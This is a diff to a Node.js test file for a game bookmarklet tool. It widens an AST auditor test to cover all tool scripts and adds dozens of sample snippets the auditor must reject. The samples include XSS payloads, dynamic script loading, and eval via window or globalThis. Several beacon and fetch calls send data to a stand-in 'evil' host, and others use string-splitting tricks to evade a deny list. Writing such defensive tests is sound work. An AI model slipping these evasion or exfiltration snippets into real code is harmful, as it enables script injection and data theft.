@@ -1,6 +1,6 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { readFileSync } from 'node:fs';
+import { readFileSync, readdirSync } from 'node:fs';
 import { join, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { validateCatalog, containedPath } from '../lib/validate.mjs';
@@ -84,7 +84,9 @@ test('bookmarklet: bộ kiểm tra AST chặn các kiểu lách danh sách cho p
   const base = readFileSync(join(ROOT, 'tool/game-bridge.js'), 'utf8');
   const overlay = readFileSync(join(ROOT, 'tool/overlay.js'), 'utf8');
   const logic = readFileSync(join(ROOT, 'tool/logic.js'), 'utf8');
-  const clean = [['game-bridge.js', base], ['overlay.js', overlay], ['logic.js', logic]];
+  const others = readdirSync(join(ROOT, 'tool')).filter(f => f.endsWith('.js') && !['game-bridge.js', 'overlay.js', 'logic.js'].includes(f)).map(f => [f, readFileSync(join(ROOT, 'tool', f), 'utf8')]);
+  const clean = [['game-bridge.js', base], ['overlay.js', overlay], ['logic.js', logic], ...others];
+  assert.ok(others.length >= 4, 'kiểm đủ mọi file tool/*.js');
   assert.deepEqual(auditSource(clean), [], 'code hiện tại phải qua kiểm tra');
   const attacks = {
     'ngoặc vuông': "export const x = g => g.session['sell' + 'Creature'](1);",
@@ -103,6 +105,29 @@ test('bookmarklet: bộ kiểm tra AST chặn các kiểu lách danh sách cho p
     'innerHTML': 'export const x = el => { el.innerHTML = "<img onerror=alert(1)>"; };',
     'dispatch': 'export const x = g => g.store.dispatch({ type: "sell" });',
     'WebSocket.prototype': 'export const x = () => WebSocket.prototype.send;',
+    'window.eval': 'export const x = s => window.eval(s);',
+    'globalThis.Function': 'export const x = s => new globalThis.Function(s);',
+    'window.fetch': "export const x = () => window.fetch('https://evil');",
+    'window.localStorage': 'export const x = () => window.localStorage;',
+    'window.XMLHttpRequest': 'export const x = () => new window.XMLHttpRequest();',
+    'khoá ghép chuỗi': "export const x = g => g['ses' + 'sion'];",
+    'khoá join': "export const x = w => w[['ev', 'al'].join('')]('1');",
+    'gọi qua x[k]()': 'export const x = (o, k) => o[k]();',
+    'truyền session vào mảng': 'export const x = g => [g.session].map(s => s.sellCreature());',
+    'gán let': 'export const x = g => { let s; s = g.session; return s; };',
+    'tham số destructuring': 'export const x = ({ session }) => session;',
+    'setTimeout chuỗi': "export const x = () => setTimeout('alert(1)', 0);",
+    'import()': "export const x = () => import('https://evil/x.js');",
+    'thẻ script': "export const x = () => document.createElement('script');",
+    'đổi location': "export const x = () => { location.href = 'https://evil'; };",
+    'location.assign': "export const x = () => location.assign('https://evil');",
+    'new Image beacon': "export const x = () => { new Image().src = 'https://evil/?' + document.title; };",
+    'gán src': "export const x = el => { el.src = 'https://evil/x.js'; };",
+    'getPrototypeOf': 'export const x = () => Object.getPrototypeOf({});',
+    'setAttribute onclick': "export const x = el => el.setAttribute('onclick', 'alert(1)');",
+    'window.open': "export const x = () => window.open('https://evil');",
+    'h(script)': "export const x = h => h('script', { src: 'x' });",
+    'h(onerror)': "export const x = h => h('img', { onerror: 'alert(1)' });",
   };
   for (const [name, snippet] of Object.entries(attacks)) {
     const files = [...clean.filter(([f]) => f !== 'logic.js'), ['logic.js', `${logic}\n${snippet}`]];
